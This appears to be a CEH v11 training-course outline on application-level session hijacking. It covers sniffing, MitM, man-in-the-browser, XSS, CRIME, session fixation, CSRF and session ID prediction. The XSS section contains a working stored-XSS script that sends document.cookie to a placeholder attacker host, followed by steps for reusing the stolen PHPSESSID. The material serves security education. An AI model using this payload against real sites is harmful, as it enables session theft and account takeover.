    Filename: eccouncil-ceh31250-v11-11-3-1-application-level-session-hijacking.md
    Show Name: CEHv11 (312-50)
    Topic Name: Network and Perimeter Hacking: Session Hijacking
    Episode Name: Application Level Session Hijacking ================================================================================

Application Level Session Hijacking
Objectives:

#    List and define common Application-Level Session Hijacking attacks

-    What are some of the common App-Level Session Hijacking attacks we should be aware of?
#        Sniffing
            Just sniff network traffic and intercept session tokens/IDs


#        MitM
            Employ MitM to enable traffic sniffing


#        MitB
            Malware-based approach
                Malware hooks the browser and intercepts session info
		- install a trojan and it 

#        XSS
            DEMO
-                Reflected
bWAPP

First name:

<script>alert('xss')</script>

Last name:

GO
# when we press go we get a pop up alert box. Which lets us know that this site is vulnerable to reflective crossite scripting 

-                DOM-based


-                Stored | Persistent
-                    Attacker setup:
                        Setup HTTP listener with Python
                        <script>new Image().src="http://ATTACK-IP:8000/bogus.php?output="+document.cookie;</script>
-                    Target then browses to 'blog'
                        Target token shows up in Attack HTTP log
-                    Attacker then copies token and logs into Web site
                        Ctrl-Shift-I to start browser Dev tools
                            Storage
                                Paste token into PHPSESSID value
                                    Reload page (you are now logged in as AIM)



#NOTE: He has never been able to make this work properly or has he seen anyone make it work properly. Or well enough to call a good demonstration.


#        CRIME
            Compression Ratio Info-Leak Made Easy
            Exploits a vulnerability in the use of compression features found in
                HTTPS/SSL/TLS
                SPDY (pronounced 'speedy')


#        Session Fixation and Donation
            Sites that transmit Session tokens via the URL are susceptible
                Fixation
                    Get an anonymous session token
                        Craft an email link (social engineering)
                            User clicks link
                                Gets sent to login page to authenticate
                                    User logs in and continues to use session token from Phish
                                        Attacker can now use the same session token and be authenticated as the target user

#                Donation
                    Same as Fixation with one small change
                        Attacker uses their authenticated session token


#        CSRF
            DEMO (just explain and show the effect, don't show setup)
-                Attack Setup
                    Login to 'bank' website and transfer a small amount
                    Grab the URL
                    Modify the POST data in the URL
                        Increase the transfer amount to 100
                    Get Target to click malicious link
                        Social Engineering
                        XSS
                            Set this as Stored XSS in 'blog'
-                Target
                    Clicks malicious link
                    Browses to Stored XSS page
        Session ID prediction
            http://example.com/webapp?sessid=3
                What happens when you change '3' to '0'?


===========================================================
Brief Descriptions 

- Man in the browser attacks are typically where you install some form of malware, typically a trojan and it takes over the browser settings. 
- It starts making changes and setting them a lot of times affecting things like proxy settings, intercepting that information like where you're 
- going and then of course the things that are returned by the servers then it's recording that and sending that information along to the attacker.
- So a man in the browser attack, not really like the malware is pretty sophisticated as far as being able to do that and go undetected and all 
- the other great stuff. But the concept of it to me is it's pretty straight forward, fairly simple. Out of malware takes over browser settings 
- And intercepts information that the browser is browsing to, right? So if it's going to a site gets it, there's any session, IDS tokens so and 
- so forth. It can grab that shovel that back to the attacker and the attacker can use that information to his nefarious ends or her nefarious 
- ends as it very well may be.

